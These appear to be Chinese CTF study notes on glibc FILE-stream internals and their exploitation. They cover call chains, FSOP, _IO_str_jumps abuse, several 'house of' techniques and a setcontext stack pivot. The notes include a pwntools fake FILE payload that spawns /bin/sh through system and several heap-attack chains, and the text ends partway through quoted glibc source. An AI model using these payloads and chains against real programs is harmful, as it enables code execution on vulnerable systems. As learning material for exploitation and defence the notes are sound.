◂— 009:0048│     0x5555555592e8 ◂— 0... ↓     3 skipped0d:0068│     0x555555559308 —▸ 0x7ffff7e044e0 (_IO_2_1_stderr_) ◂— 0xfbad20860e:0070│     0x555555559310 ◂— 30f:0078│     0x555555559318 ◂— 0pwndbg&gt;10:0080│     0x555555559320 ◂— 011:0088│     0x555555559328 —▸ 0x555555559380 ◂— 112:0090│     0x555555559330 ◂— 0xffffffffffffffff13:0098│     0x555555559338 ◂— 014:00a0│     0x555555559340 —▸ 0x555555559390 ◂— 015:00a8│     0x555555559348 ◂— 0... ↓     2 skippedpwndbg&gt;18:00c0│     0x555555559360 ◂— 0... ↓     2 skipped1b:00d8│     0x555555559378 —▸ 0x7ffff7e02030 (_IO_file_jumps) ◂— 01c:00e0│     0x555555559380 ◂— 11d:00e8│     0x555555559388 —▸ 0x7ffff7fb2740 ◂— 0x7ffff7fb27401e:00f0│     0x555555559390 ◂— 01f:00f8│     0x555555559398 ◂— 0pwndbg&gt;20:0100│     0x5555555593a0 ◂— 0... ↓     7 skippedpwndbg&gt;28:0140│     0x5555555593e0 ◂— 0... ↓     7 skippedpwndbg&gt;30:0180│     0x555555559420 ◂— 0... ↓     7 skippedpwndbg&gt;38:01c0│     0x555555559460 ◂— 039:01c8│     0x555555559468 ◂— 03a:01d0│     0x555555559470 —▸ 0x7ffff7e02228 (_IO_wfile_jumps) ◂— 03b:01d8│     0x555555559478 ◂— 0x10113c:01e0│ rsi 0x555555559480 ◂— 0... ↓        3 skipped
pwndbg&gt; tele 0x55555555947000:0000│         0x555555559470 —▸ 0x7ffff7e02228 (_IO_wfile_jumps) ◂— 001:0008│         0x555555559478 ◂— 0x101102:0010│ rax rsi 0x555555559480 ◂— &#x27;your_flag_content\n&#x27;03:0018│         0x555555559488 ◂— &#x27;g_content\n&#x27;04:0020│         0x555555559490 ◂— 0xa74 /* &#x27;t\n&#x27; */05:0028│         0x555555559498 ◂— 0... ↓            2 skipped
[[./fread1.png]]
fwrite

fwrite
_IO_fwrite
_IO_file_xsputn
若缓冲区有剩余空间，则在不超过缓冲区空闲空间的前提下尽可能多的待输出数据复制到缓冲区
若有数据没有复制到缓冲区中，则调用_IO_new_file_overflow输出并清空输出缓存区数据
new_do_while直接输出buf中数据
如果还有剩余数据则调用_IO_default_xsputn复制到输出缓冲区，如果剩余长度大于20字节则使用memcpy否则直接赋值 [[./fwrite1.png]]

fclose

fopen
_IO_new_fclose
_IO_un_link
_IO_file_close_it

vtable
fopen
函数是在分配空间，建立FILE结构体，未调用vtable中的函数
fread

_IO_sgetn函数调用了_IO_file_xsgetn
_IO_doallocbuf函数调用了_IO_file_doallocate以初始化输入缓冲区
_IO_file_doallocate调用了__GI__IO_file_stat获取文件信息
__underflow调用了_IO_new_file_underflow实现文件数据读取
_IO_new_file_underflow调用了vtable__GI__IO_file_read最终去执行系统调用read

fwrite

_IO_fwrite调用了_IO_new_file_xsputn
_IO_new_file_xsputn调用了_IO_new_file_overflow实现缓冲区的建立以及刷新缓冲区
_IO_new_file_overflow调用了_IO_file_doallocate以初始化输入缓冲区
_IO_file_doallocate调用了vtable中的 __GI__IO_file_stat以获取文件信息
new_do_write中的_IO_SYSWRITE调用了vtable_IO_new_file_write最终去执行系统调用write

fclose

在清空缓冲区的_IO_do_write中会调用vtable中的函数
关闭文件描述符_IO_SYSCLOSE为vtable中的 __close函数
_IO_FINISH为vtable中的__finish

FSOP

核心思想：劫持_IO_list_all指向伪造的_IO_FILE_plus，之后使程序执行_IO_flush_all_lockp函数。该函数会刷新_IO_list_all链表中所有项的文件流，相当于对每个FILE调用fflush，也对应着会调用_IO_FILE_plus.vtable中的_IO_overflow
利用前提：

程序执行_IO_flush_all_lockp函数有三种情况：

当libc执行abort流程时（2.27之后不再刷新）
当执行exit函数时（仅刷新 stderr ，2.36后不再刷新）
当执行流从main函数返回时

绕过检查


abort栈回溯为： _IO_flush_all_lockp (do_lock=do_lock@entry=0x0)__GI_abort ()__libc_message (do_abort=do_abort@entry=0x2, fmt=fmt@entry=0x7ffff7ba0d58 &quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;)malloc_printerr (action=0x3, str=0x7ffff7ba0e90 &quot;double free or corruption (top)&quot;, ptr=&lt;optimized out&gt;, ar_ptr=&lt;optimized out&gt;)_int_free (av=0x7ffff7dd4b20 &lt;main_arena&gt;, p=&lt;optimized out&gt;,have_lock=0x0)main ()__libc_start_main (main=0x400566 &lt;main&gt;, argc=0x1, argv=0x7fffffffe578, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe568)_start () exit函数，栈回溯为： _IO_flush_all_lockp (do_lock=do_lock@entry=0x0)_IO_cleanup ()__run_exit_handlers (status=0x0, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=0x1)__GI_exit (status=&lt;optimized out&gt;)main ()__libc_start_main (main=0x400566 &lt;main&gt;, argc=0x1, argv=0x7fffffffe578, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe568)_start () 程序正常退出，栈回溯为： IO_flush_all_lockp (do_lock=do_lock@entry=0x0)_IO_cleanup ()__run_exit_handlers (status=0x0, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=0x1)__GI_exit (status=&lt;optimized out&gt;)__libc_start_main (main=0x400526 &lt;main&gt;, argc=0x1, argv=0x7fffffffe578, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffe568)_start ()
if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW(fp, EOF) == EOF) &#123;    result = EOF;&#125;
fake_file = b&quot;&quot;fake_file += b&quot;/bin/sh\x00&quot;  # _flags, an magic numberfake_file += p64(0)  # _IO_read_ptrfake_file += p64(0)  # _IO_read_endfake_file += p64(0)  # _IO_read_basefake_file += p64(0)  # _IO_write_basefake_file += p64(libc.sym[&#x27;system&#x27;])  # _IO_write_ptrfake_file += p64(0)  # _IO_write_endfake_file += p64(0)  # _IO_buf_base;fake_file += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)fake_file += p64(0) * 4  # from _IO_save_base to _markersfake_file += p64(libc.sym[&#x27;_IO_2_1_stdout_&#x27;])  # the FILE chain ptrfake_file += p32(2)  # _fileno for stderr is 2fake_file += p32(0)  # _flags2, usually 0fake_file += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1fake_file += p16(0)  # _cur_columnfake_file += b&quot;\x00&quot;  # _vtable_offsetfake_file += b&quot;\n&quot;  # _shortbuf[1]fake_file += p32(0)  # paddingfake_file += p64(libc.sym[&#x27;_IO_2_1_stdout_&#x27;] + 0x1ea0)  # _IO_stdfile_1_lockfake_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1fake_file += p64(0)  # _codecvt, usually 0fake_file += p64(libc.sym[&#x27;_IO_2_1_stdout_&#x27;] - 0x160)  # _IO_wide_data_1fake_file += p64(0) * 3  # from _freeres_list to __pad5fake_file += p32(0xFFFFFFFF)  # _mode, usually -1fake_file += b&quot;\x00&quot; * 19  # _unused2fake_file = fake_file.ljust(0xD8, b&#x27;\x00&#x27;)  # adjust to vtablefake_file += p64(libc.sym[&#x27;_IO_2_1_stderr_&#x27;] + 0x10)  # fake vtable
缓冲区利用(未完善)
stdin
任意地址写
stdout
任意地址写
任意地址读
__IO_str_jumps(under 2.27)

利用_IO_str_jumps或__IO_wstr_jumps填入vtable绕过IO_validate_vtable检查
确定_IO_str_jumps地址

由于_IO_str_jumps不是导出符号，libc.sym["_IO_str_jumps"]查不到，可以利用_IO_str_jumps中的导出函数例如 _IO_str_underflow进行辅助定位
首先先得到_IO_str_underflow地址，然后查找所有指向该地址的指针
由于_IO_str_underflow在_IO_str_jumps的偏移为0x20，并且_IO_str_jumps的地址大于_IO_file_jumps地址，因此可以在选择满足上述条件中最小的地址作为_IO_str_jumps的地址 from bisect import *IO_file_jumps = libc.symbols[&#x27;_IO_file_jumps&#x27;]IO_str_underflow = libc.symbols[&#x27;_IO_str_underflow&#x27;]IO_str_underflow_ptr = list(libc.search(p64(IO_str_underflow)))IO_str_jumps = IO_str_underflow_ptr[bisect_left(IO_str_underflow_ptr, IO_file_jumps + 0x20)] - 0x20print(hex(IO_str_jumps))

劫持io_str_finish void_IO_str_finish (_IO_FILE *fp, int dummy)&#123;  if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  fp-&gt;_IO_buf_base = NULL;  _IO_default_finish (fp, 0);&#125;
将vatble指针修改为指向&amp;_IO_str_jumps - 8的地址就可以执行_IO_str_finish
fp-&gt;_IO_buf_base不为空，并且作为fp-&gt;_s._free_buffer的第一个参数，因此可以使用/bin/sh的地址
fp-&gt;_flags要不包含_IO_USER_BUF，它的定义为#define _IO_USER_BUF 1，即fp-&gt;_flags最低位为0
_IO_write_base &lt; _IO_write_ptr，_mode &lt;= 0
修改((_IO_strfile *) fp)-&gt;_s._free_buffer为system地址，即将fp+0xE8处的值改为system地址
执行_IO_flush_all_lockp

堆利用结合
leak libc
libc-2.23

fastbin attack 在 _IO_2_1_stdout_-0x43 处申请 fastbin
修改_IO_write_base指针的最低 1 字节使其指向_chain变量，而_chain变量中存储了_IO_2_1_stdin_结构体地址，程序在下一次输出内容时会先将 write buf 中的内容输出出来

vtable

fastbin attack在_IO_2_1_stdout_+157地址处申请0x60大小的堆块
修改vtable指针指向事先伪造的vtable(*(vtable+0x10)=system_addr)，在调用IO函数时会将_IO_2_1_stdout_结构体指针作为参数传入vtable中的函数，因此可以在_IO_2_1_stdout_结构体flag字段之后的 4 字节填充中写入;sh;

house of orange
见attack ### house of husk 见attack ### house of kiwi(under 2.36) * 在没有exit下调用vtable sysmalloc： assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||        ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;         prev_inuse (old_top) &amp;&amp;         ((unsigned long) old_end &amp; (pagesize - 1)) == 0)); __malloc_assert： static void__malloc_assert (const char *assertion, const char *file, unsigned int line,		 const char *function)&#123;  (void) __fxprintf (NULL, &quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;,		     __progname, __progname[0] ? &quot;: &quot; : &quot;&quot;,		     file, line,		     function ? function : &quot;&quot;, function ? &quot;: &quot; : &quot;&quot;,		     assertion);  fflush (stderr);  abort ();&#125; 利用fflush中的_IO_fflush，会调用call [rbp + 0x60]，rbp指向_IO_file_jumps_，调用的是_IO_new_file_sync，并且_IO_file_jumps_可写，因此只需要将_IO_file_jumps_对应_IO_new_file_sync函数指针的位置覆盖为one_gadget就可以获取
setcontext+61
.text:0000000000050C0D mov     rsp, [rdx+0A0h].text:0000000000050C14 mov     rbx, [rdx+80h].text:0000000000050C1B mov     rbp, [rdx+78h].text:0000000000050C1F mov     r12, [rdx+48h].text:0000000000050C23 mov     r13, [rdx+50h].text:0000000000050C27 mov     r14, [rdx+58h].text:0000000000050C2B mov     r15, [rdx+60h].text:0000000000050C2F test    dword ptr fs:48h, 2.text:0000000000050C3B jz      loc_50CF6....text:0000000000050CF6 loc_50CF6:                              ; CODE XREF: setcontext+6B↑j.text:0000000000050CF6 mov     rcx, [rdx+0A8h].text:0000000000050CFD push    rcx.text:0000000000050CFE mov     rsi, [rdx+70h].text:0000000000050D02 mov     rdi, [rdx+68h].text:0000000000050D06 mov     rcx, [rdx+98h].text:0000000000050D0D mov     r8, [rdx+28h].text:0000000000050D11 mov     r9, [rdx+30h].text:0000000000050D15 mov     rdx, [rdx+88h].text:0000000000050D15 ; &#125; // starts at 50BD0.text:0000000000050D1C ; __unwind &#123;.text:0000000000050D1C xor     eax, eax.text:0000000000050D1E retn
调用_IO_new_file_sync时rdx指向的是_IO_helper_jumps_结构，可以通过修改_IO_helper_jumps_中的内容来给寄存器赋值
以rop方法为例，需要设置rsp指向提前布置号的rop的起始位置，同时设置rip指向ret 指令
如果存在一个任意写,通过修改 _IO_file_jumps + 0x60的_IO_file_sync指针为setcontext+61 修改IO_helper_jumps + 0xA0 and 0xA8分别为可迁移的存放有ROP的位置和ret指令的gadget位置，则可以进行栈迁移
house of pig(仍可以任意写)

起码UAF


先用UAF漏洞泄露libc、heap
再用UAF修改largebin内chunk的fd_nextsize和bk_nextsize位置，完成一次largebin attack，将一个堆地址写到__free_hook-0x8的位置，使得满足之后的tcache stashing unlink attack需要目标fake chunk的bk位置内地址可写的条件
先构造同一大小的5个tcache，继续用UAF修改该大小的smallbin内chunk的fd、bk位置，完成一次tcache stashing unlink attack，由于前一步已经将一个可写的堆地址，写到了__free_hook-0x8，所以可以将__free_hook-0x10的位置当作一个fake chunk，放入到tcache链表的头部，但是由于没有 malloc，我们无法将他申请出来
最后再用UAF修改largebin内chunk的fd_nextsize和bk_nextsize位置，完成第二次largebin attack，将一个堆地址写到_IO_list_all的位置，从而在程序退出前fflush所有IO流的时候，将该堆地址当作一个FILE结构体，我们就能在该堆地址的位置来构造任意FILE结构了
在该堆地址构造FILE结构的时候，重点是将其vtable由_IO_file_jumps修改为_IO_str_jumps，那么当原本应该调用IO_file_overflow的时候，就会转而调用如下的IO_str_overflow，而该函数是以传入的FILE地址本身为参数的，同时其中会连续调用malloc、memcpy、free函数，且三个函数的参数又都可以被该FILE结构中的数据控制。那么适当的构造FILE结构中的数据，就可以实现利用IO_str_overflow函数中的malloc申请出那个已经被放入到tcache链表的头部的包含__free_hook的fake chunk；紧接着可以将提前在堆上布置好的数据，通过IO_str_overflow函数中的memcpy写入到刚刚申请出来的包含__free_hook的这个chunk，从而能任意控制__free_hook，这里可以将其修改为 system函数地址；最后调用IO_str_overflow函数中的free时，就能够触发__free_hook，同时还能在提前布置堆上数据的时候，使其以字符串/bin/sh\x00开头，那么最终就会执行system(“/bin/sh”)

house of emma
通过修改_IO_file_jumps为_IO_cookie_jumps+offset，使得最后+偏移为_IO_cookie_write
然后在_IO_cookie_write中会直接调用指针，设置好偏移就可以去控制执行流
static const struct _IO_jump_t _IO_cookie_jumps libio_vtable = &#123;    JUMP_INIT_DUMMY,    JUMP_INIT(finish, _IO_file_finish),    JUMP_INIT(overflow, _IO_file_overflow),    JUMP_INIT(underflow, _IO_file_underflow),    JUMP_INIT(uflow, _IO_default_uflow),    JUMP_INIT(pbackfail, _IO_default_pbackfail),    JUMP_INIT(xsputn, _IO_file_xsputn),    JUMP_INIT(xsgetn, _IO_default_xsgetn),    JUMP_INIT(seekoff, _IO_cookie_seekoff),    JUMP_INIT(seekpos, _IO_default_seekpos),    JUMP_INIT(setbuf, _IO_file_setbuf),    JUMP_INIT(sync, _IO_file_sync),    JUMP_INIT(doallocate, _IO_file_doallocate),    JUMP_INIT(read, _IO_cookie_read),    JUMP_INIT(write, _IO_cookie_write),    JUMP_INIT(seek, _IO_cookie_seek),    JUMP_INIT(close, _IO_cookie_close),    JUMP_INIT(stat, _IO_default_stat),    JUMP_INIT(showmanyc, _IO_default_showmanyc),    JUMP_INIT(imbue, _IO_default_imbue),  &#125;;
里面存在的_IO_cookie_read、_IO_cookie_write、_IO_cookie_seek、_IO_cookie_close
static ssize_t  _IO_cookie_read (FILE *fp, void *buf, ssize_t size)			// read  &#123;    struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;    cookie_read_function_t *read_cb = cfile-&gt;__io_functions.read;  #ifdef PTR_DEMANGLE    PTR_DEMANGLE (read_cb);  #endif      if (read_cb == NULL)      return -1;      return read_cb (cfile-&gt;__cookie, buf, size);  &#125;    static ssize_t  _IO_cookie_write (FILE *fp, const void *buf, ssize_t size)	// write  &#123;    struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;    cookie_write_function_t *write_cb = cfile-&gt;__io_functions.write;  #ifdef PTR_DEMANGLE    PTR_DEMANGLE (write_cb);  #endif      if (write_cb == NULL)      &#123;        fp-&gt;_flags |= _IO_ERR_SEEN;        return 0;      &#125;      ssize_t n = write_cb (cfile-&gt;__cookie, buf, size);    if (n &lt; size)      fp-&gt;_flags |= _IO_ERR_SEEN;      return n;  &#125;    static off64_t  _IO_cookie_seek (FILE *fp, off64_t offset, int dir)		// seek  &#123;    struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;    cookie_seek_function_t *seek_cb = cfile-&gt;__io_functions.seek;  #ifdef PTR_DEMANGLE    PTR_DEMANGLE (seek_cb);  #endif      return ((seek_cb == NULL         || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)             == -1)         || offset == (off64_t) -1)        ? _IO_pos_BAD : offset);  &#125;    static int  _IO_cookie_close (FILE *fp)								// close  &#123;    struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;    cookie_close_function_t *close_cb = cfile-&gt;__io_functions.close;  #ifdef PTR_DEMANGLE    PTR_DEMANGLE (close_cb);  #endif      if (close_cb == NULL)      return 0;      return close_cb (cfile-&gt;__cookie);  &#125;
这几个函数中都存在直接的函数调用 当然在函数调用前存在一个检测PTR_DEMANGLE 调试过程可以发现，利用的fs[0x30]，可以去修改该处值为我们已知值
house of banana
exit
main()函数return时，有一些析构工作需要完成 - 用户层面： - 需要释放libc中的流缓冲区，退出前清空下stdout的缓冲区，释放TLS, … - 内核层面： - 释放掉这个进程打开的文件描述符，释放掉task结构体，… - 再所有资源都被释放完毕后，内核会从调度队列从取出这个任务 - 然后向父进程发送一个信号，表示有一个子进程终止 - 此时这个进程才算是真正结束
因此我们可以认为： - 进程终止 =&gt; 释放其所占有的资源 + 不再分配CPU时间给这个进程
内核层面的终止是通过exit系统调用来进行的，其实现就是一个syscall，libc中声明为 #include &lt;unistd.h&gt; void _exit(int status);
但是如果直接调用_exit()，会出现一些问题，比如stdout的缓冲区中的数据会直接被内核释放掉，无法刷新，导致信息丢失 因此在调用_exit()之前，还需要在用户层面进行一些析构工作
libc将负责这个工作的函数定义为exit()，其声明如下 #include &lt;stdlib.h&gt; extern void exit (int __status);void  exit (int status)  &#123;    __run_exit_handlers (status, &amp;__exit_funcs, true, true);  &#125;voidattribute_hidden__run_exit_handlers (int status, struct exit_function_list **listp,		     bool run_list_atexit, bool run_dtors)&#123;  /* First, call the TLS destructors.  */#ifndef SHARED  if (&amp;__call_tls_dtors != NULL)#endif    if (run_dtors)      __call_tls_dtors ();  __libc_lock_lock (__exit_funcs_lock);  /* We do it this way to handle recursive calls to exit () made by     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call     everyone on the list and use the status value in the last     exit (). */  while (true)    &#123;      struct exit_function_list *cur = *listp;      if (cur == NULL)	&#123;	  /* Exit processing complete.  We will not allow any more	     atexit/on_exit registrations.  */	  __exit_funcs_done = true;	  break;	&#125;      while (cur-&gt;idx &gt; 0)	&#123;	  struct exit_function *const f = &amp;cur-&gt;fns[--cur-&gt;idx];	  const uint64_t new_exitfn_called = __new_exitfn_called;	  switch (f-&gt;flavor)	    &#123;	      void (*atfct) (void);	      void (*onfct) (int status, void *arg);	      void (*cxafct) (void *arg, int status);	      void *arg;	    case ef_free:	    case ef_us:	      break;	    case ef_on:	      onfct = f-&gt;func.on.fn;	      arg = f-&gt;func.on.arg;#ifdef PTR_DEMANGLE	      PTR_DEMANGLE (onfct);#endif	      /* Unlock the list while we call a foreign function.  */	      __libc_lock_unlock (__exit_funcs_lock);	      onfct (status, arg);	      __libc_lock_lock (__exit_funcs_lock);	      break;	    case ef_at:	      atfct = f-&gt;func.at;#ifdef PTR_DEMANGLE	      PTR_DEMANGLE (atfct);#endif	      /* Unlock the list while we call a foreign function.  */	      __libc_lock_unlock (__exit_funcs_lock);	      atfct ();	      __libc_lock_lock (__exit_funcs_lock);	      break;	    case ef_cxa:	      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),		 we must mark this function as ef_free.  */	      f-&gt;flavor = ef_free;	      cxafct = f-&gt;func.cxa.fn;	      arg = f-&gt;func.cxa.arg;#ifdef PTR_DEMANGLE	      PTR_DEMANGLE (cxafct);#endif	      /* Unlock the list while we call a foreign function.  */	      __libc_lock_unlock (__exit_funcs_lock);	      cxafct (arg, status);	      __libc_lock_lock (__exit_funcs_lock);	      break;	    &#125;	  if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))	    /* The last exit function, or another thread, has registered	       more exit functions.  Start the loop over.  */            continue;	&#125;      *listp = cur-&gt;next;      if (*listp != NULL)	/* Don&#x27;t free the last element in the chain, this is the statically	   allocate element.  */	free (cur);    &#125;  __libc_lock_unlock (__exit_funcs_lock);  if (run_list_atexit)    RUN_HOOK (__libc_atexit, ());  _exit (status);&#125;struct exit_function    &#123;      /* `flavour&#x27; should be of type of the `enum&#x27; above but since we need         this element in an atomic operation we have to use `long int&#x27;.  */      long int flavor;      union        &#123;  	void (*at) (void);  	struct  	  &#123;  	    void (*fn) (int status, void *arg);  	    void *arg;  	  &#125; on;  	struct  	  &#123;  	    void (*fn) (void *arg, int status);  	    void *arg;  	    void *dso_handle;  	  &#125; cxa;        &#125; func;    &#125;;  struct exit_function_list    &#123;      struct exit_function_list *next;      size_t idx;      struct exit_function fns[32];    &#125;;  extern struct exit_function_list *__exit_funcs attribute_hidden;
综上所述： * exit(status) *__run_exit_handlers(status)*__call_tls_dtors* 遍历exit_function_list*ef_cxa：调用__cxa_atexit注册函数     *ef_at：调用atexit注册的函数     *ef_on：调用on_exit注册的函数     * ... * 若执行期间有新的回调注册则回到链表头重新执行 * 释放动态分配的回调节点     * 如果run_list_atexit==true，则执行__libc_atexit* 最终调用_exit(status)`
__exit_funcs
函数指针要用fs:0x30解密
typedef struct  &#123;    void *tcb;		/* Pointer to the TCB.  Not necessarily the  			   thread descriptor used by libpthread.  */    dtv_t *dtv;    void *self;		/* Pointer to the thread descriptor.  */    int multiple_threads;    int gscope_flag;    uintptr_t sysinfo;    uintptr_t stack_guard;    uintptr_t pointer_guard;    unsigned long int unused_vgetcpu_cache[2];    /* Bit 0: X86_FEATURE_1_IBT.       Bit 1: X86_FEATURE_1_SHSTK.     */    unsigned int feature_1;    int __glibc_unused1;    /* Reservation of some values for the TM ABI.  */    void *__private_tm[4];    /* GCC split stack support.  */    void *__private_ss;    /* The lowest address of shadow stack,  */    unsigned long long int ssp_base;    /* Must be kept even if it is no longer used by glibc since programs,       like AddressSanitizer, depend on the size of tcbhead_t.  */    __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));      void *__padding[8];  &#125; tcbhead_t;
exit_function注册
遍历链表执行的是atexit等函数注册的函数，我们找到atexit /* Register FUNC to be executed by `exit&#x27;.  */int#ifndef atexitattribute_hidden#endifatexit (void (*func) (void))&#123;  return __cxa_atexit ((void (*) (void *)) func, NULL, __dso_handle);&#125; 而__cxa_atexit /* Register a function to be called by exit or when a shared library   is unloaded.  This function is only called from code generated by   the C++ compiler.  */int__cxa_atexit (void (*func) (void *), void *arg, void *d)&#123;  return __internal_atexit (func, arg, d, &amp;__exit_funcs);&#125;libc_hidden_def (__cxa_atexit) 而__internal_atexit intattribute_hidden__internal_atexit (void (*func) (void *), void *arg, void *d,		   struct exit_function_list **listp)&#123;  struct exit_function *new;  /* As a QoI issue we detect NULL early with an assertion instead     of a SIGSEGV at program exit when the handler is run (bug 20544).  */  assert (func != NULL);  __libc_lock_lock (__exit_funcs_lock);  new = __new_exitfn (listp);  if (new == NULL)    &#123;      __libc_lock_unlock (__exit_funcs_lock);      return -1;    &#125;#ifdef PTR_MANGLE  PTR_MANGLE (func);#endif  new-&gt;func.cxa.fn = (void (*) (void *, int)) func;  new-&gt;func.cxa.arg = arg;  new-&gt;func.cxa.dso_handle = d;  new-&gt;flavor = ef_cxa;  __libc_lock_unlock (__exit_funcs_lock);  return 0;&#125; 而__new_exitfn /* Must be called with __exit_funcs_lock held.  */struct exit_function *__new_exitfn (struct exit_function_list **listp)&#123;  struct exit_function_list *p = NULL;  struct exit_function_list *l;  struct exit_function *r = NULL;  size_t i = 0;  if (__exit_funcs_done)    /* Exit code is finished processing all registered exit functions,       therefore we fail this registration.  */    return NULL;  for (l = *listp; l != NULL; p = l, l = l-&gt;next)    &#123;      for (i = l-&gt;idx; i &gt; 0; --i)	if (l-&gt;fns[i - 1].flavor != ef_free)	  break;      if (i &gt; 0)	break;      /* This block is completely unused.  */      l-&gt;idx = 0;    &#125;  if (l == NULL || i == sizeof (l-&gt;fns) / sizeof (l-&gt;fns[0]))    &#123;      /* The last entry in a block is used.  Use the first entry in	 the previous block if it exists.  Otherwise create a new one.  */      if (p == NULL)	&#123;	  assert (l != NULL);	  p = (struct exit_function_list *)	    calloc (1, sizeof (struct exit_function_list));	  if (p != NULL)	    &#123;	      p-&gt;next = *listp;	      *listp = p;	    &#125;	&#125;      if (p != NULL)	&#123;	  r = &amp;p-&gt;fns[0];	  p-&gt;idx = 1;	&#125;    &#125;  else    &#123;      /* There is more room in the block.  */      r = &amp;l-&gt;fns[i];      l-&gt;idx = i + 1;    &#125;  /* Mark entry as used, but we don&#x27;t know the flavor now.  */  if (r != NULL)    &#123;      r-&gt;flavor = ef_us;      ++__new_exitfn_called;    &#125;  return r;&#125;
先尝试在__exit_funcs中找到一个exit_function类型的ef_free的位置, ef_free代表着此位置空闲
如果没找到, 就新建一个exit_function节点, 使用头插法插入__exit_funcs链表, 使用新节点的第一个位置作为分配到的exit_function结构体设置找到的exit_function的类型为ef_us, 表示正在使用中, 并返回
这里只是找位置，那么注册的是什么函数呢？这些函数在main之前就被注册了，我们看一下程序的入口_start
_start
ENTRY (_start)	/* Clearing frame pointer is insufficient, use CFI.  */	cfi_undefined (rip)	/* Clear the frame pointer.  The ABI suggests this be done, to mark	   the outermost frame obviously.  */	xorl %ebp, %ebp	/* Extract the arguments as encoded on the stack and set up	   the arguments for __libc_start_main (int (*main) (int, char **, char **),		   int argc, char *argv,		   void (*init) (void), void (*fini) (void),		   void (*rtld_fini) (void), void *stack_end).	   The arguments are passed via registers and on the stack:	main:		%rdi	argc:		%rsi	argv:		%rdx	init:		%rcx	fini:		%r8	rtld_fini:	%r9	stack_end:	stack.	*/	mov %RDX_LP, %R9_LP	/* Address of the shared library termination				   function.  */#ifdef __ILP32__	mov (%rsp), %esi	/* Simulate popping 4-byte argument count.  */	add $4, %esp#else	popq %rsi		/* Pop the argument count.  */#endif	/* argv starts just at the current stack top.  */	mov %RSP_LP, %RDX_LP	/* Align the stack to a 16 byte boundary to follow the ABI.  */	and  $~15, %RSP_LP	/* Push garbage because we push 8 more bytes.  */	pushq %rax	/* Provide the highest stack address to the user code (for stacks	   which grow downwards).  */	pushq %rsp	/* These used to be the addresses of .fini and .init.  */	xorl %r8d, %r8d	xorl %ecx, %ecx#ifdef PIC	mov main@GOTPCREL(%rip), %RDI_LP#else	mov $main, %RDI_LP#endif	/* Call the user&#x27;s main function, and exit with its value.	   But let the libc call main.  Since __libc_start_main in	   libc.so is called very early, lazy binding isn&#x27;t relevant	   here.  Use indirect branch via GOT to avoid extra branch	   to PLT slot.  In case of static executable, ld in binutils	   2.26 or above can convert indirect branch into direct	   branch.  */	call *__libc_start_main@GOTPCREL(%rip)	hlt			/* Crash if somehow `exit&#x27; does return.	 */END (_start)/* Define a symbol for the first piece of initialized data.  */	.data	.globl __data_start__data_start:	.long 0	.weak data_start	data_start = __data_start
我们关注其传递给__libc_start_main的参数main，argc，argv，init，fini，rtld_fini，stack_end，前三个不用赘述，init，fini，rtld_fini
/* Note: The init and fini parameters are no longer used.  fini is   completely unused, init is still called if not NULL, but the   current startup code always passes NULL.  (In the future, it would   be possible to use fini to pass a version code if init is NULL, to   indicate the link-time glibc without introducing a hard   incompatibility for new programs with older glibc versions.)   For dynamically linked executables, the dynamic segment is used to   locate constructors and destructors.  For statically linked   executables, the relevant symbols are access directly.  */STATIC intLIBC_START_MAIN (int (*main) (int, char **, char ** MAIN_AUXVEC_DECL),		 int argc, char **argv,#ifdef LIBC_START_MAIN_AUXVEC_ARG		 ElfW(auxv_t) *auxvec,#endif		 __typeof (main) init,		 void (*fini) (void),		 void (*rtld_fini) (void), void *stack_end)&#123;#ifndef SHARED  char **ev = &amp;argv[argc + 1];  __environ = ev;  /* Store the lowest stack address.  This is done in ld.so if this is     the code for the DSO.  */  __libc_stack_end = stack_end;# ifdef HAVE_AUX_VECTOR  /* First process the auxiliary vector since we need to find the     program header to locate an eventually present PT_TLS entry.  */#  ifndef LIBC_START_MAIN_AUXVEC_ARG  ElfW(auxv_t) *auxvec;  &#123;    char **evp = ev;    while (*evp++ != NULL)      ;    auxvec = (ElfW(auxv_t) *) evp;  &#125;#  endif  _dl_aux_init (auxvec);  if (GL(dl_phdr) == NULL)# endif    &#123;      /* Starting from binutils-2.23, the linker will define the         magic symbol __ehdr_start to point to our own ELF header         if it is visible in a segment that also includes the phdrs.         So we can set up _dl_phdr and _dl_phnum even without any         information from auxv.  */      extern const ElfW(Ehdr) __ehdr_start# if BUILD_PIE_DEFAULT	__attribute__ ((visibility (&quot;hidden&quot;)));# else	__attribute__ ((weak, visibility (&quot;hidden&quot;)));      if (&amp;__ehdr_start != NULL)# endif        &#123;          assert (__ehdr_start.e_phentsize == sizeof *GL(dl_phdr));          GL(dl_phdr) = (const void *) &amp;__ehdr_start + __ehdr_start.e_phoff;          GL(dl_phnum) = __ehdr_start.e_phnum;        &#125;    &#125;  /* Initialize very early so that tunables can use it.  */  __libc_init_secure ();  __tunables_init (__environ);  ARCH_INIT_CPU_FEATURES ();  /* Do static pie self relocation after tunables and cpu features     are setup for ifunc resolvers. Before this point relocations     